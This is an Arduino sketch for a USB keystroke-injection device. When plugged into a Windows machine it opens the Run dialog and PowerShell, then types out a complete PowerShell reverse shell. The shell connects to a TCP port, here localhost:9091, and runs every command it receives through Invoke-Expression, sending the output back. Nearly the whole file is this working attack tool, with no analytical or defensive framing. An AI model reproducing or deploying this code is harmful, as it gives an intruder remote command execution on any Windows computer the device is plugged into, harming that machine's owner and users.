// l0x539

#include <HID.h>
#include <Keyboard.h>
#include <ctype.h>


bool rec = false;

void setup() {
  // put your setup code here, to run once:

}

void loop() {
  static bool a = true;
  static char cmd[] = "cmd";
  static char t[] = "";
  static char cd[] = "cd /";
  static char ps[] = "powershell";
  static char payload[] = "$client = New-Object System.Net.Sockets.TCPClient(\"localhost\", 9091);$stream = $client.GetStream();";
  static char payload1[] = " $c = '[ byte[]]$bytes = 0..65535|%{ 0}; while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);$sendback = (iex $data 2' + [ CHAR][ BYTE]0x3E + '&1 | Out-String);$sendback2 = $sendback + \"PS \" + (pwd).Path + \"' + [ CHAR][ BYTE]0x3E + ' \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()}';Invoke-Expression $c";
  static char newLine[] = "\r\n";
  
  if (a) {
    delay(1000);
    Keyboard.press(KEY_LEFT_GUI);
    delay(50);
    Keyboard.press('r');
    delay(500);
    Keyboard.releaseAll();
    typeStringIn(cmd);
    typeStringIn(newLine);
    delay(3000);
    typeStringIn(cd);
    typeStringIn(newLine);
    delay(300);
    typeStringIn(ps);
    typeStringIn(newLine);
    delay(300);
    typeStringIn(payload);
    typeStringIn(newLine); 
    delay(100);
    typeStringIn(payload1);
    typeStringIn(newLine);       
    
  }
  a = false;
}

void typeStringIn(char* str) {
    for (int i=0; i < strlen(str); i++) {
      if (str[i] == '\xFF') {
        rec = rec?false:true;
      } else if (str[i] == '\x85' || str[i] == '\x86') {
        hotKeyHere(str[i], str[i+1]);
        i++;
      } else if (rec && isDigit(str[i])) {
        Keyboard.press(KEY_RIGHT_SHIFT);
        delay(5);
        Keyboard.press(str[i]);
        Keyboard.releaseAll(); 
      } else {
        Keyboard.press(str[i]);
        delay(5);
        Keyboard.releaseAll(); 
      }
    }
    rec=false;
}

void TestTypeStringIn(char* str) {
    for (int i=0; i < strlen(str); i++) {
      
        Keyboard.press(str[i]);
        delay(50);
        Keyboard.releaseAll(); 

    }
    rec=false;
}

void hotKeyHere(char a, char b) {
  Keyboard.press(a);
  delay(5);
  Keyboard.press(b);
  delay(2);
  Keyboard.releaseAll();
}
